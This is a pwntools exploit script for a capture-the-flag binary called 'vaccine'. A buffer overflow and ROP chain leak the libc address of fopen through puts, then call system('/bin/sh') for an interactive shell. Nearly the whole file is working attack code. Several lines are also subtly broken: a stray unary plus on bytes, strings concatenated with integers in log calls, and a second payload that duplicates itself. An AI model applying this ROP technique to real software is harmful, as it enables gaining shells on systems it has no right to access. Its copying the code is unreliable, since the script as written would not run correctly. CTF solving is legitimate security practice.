#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF('./vaccine')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#r = remote('vaccine.chal.ctf.acsc.asia', 1337)
r = process('./vaccine')

str="""
b* main+417
"""
#gdb.attach(r, str)

pop_rdi_ret = 0x401443
pop_rsi_ret = 0x401441
ret = 0x40101a
payload = b'A' 
payload += + b'\x00'*111
payload += b'A'
payload = payload.ljust(0x100, b'\x00')
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(elf.got['fopen'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])

r.sendline(payload)

leak = r.recv()
fopen_leak = u64(leak[:6].ljust(8, b"\x00"))
log.info('fopen_leak: ' + fopen_leak)

libc_base = fopen_leak - libc.symbols['fopen']
log.info('libc_base: ' + libc_base)

bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.symbols['system']
exit = libc_base + libc.symbols['exit']

payload = b'A' 
payload += b'\x00'*111
payload += b'A'
payload += payload.ljust(0x100, b'\x00')
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
payload += p64(exit)

r.sendline(payload)
r.interactive()
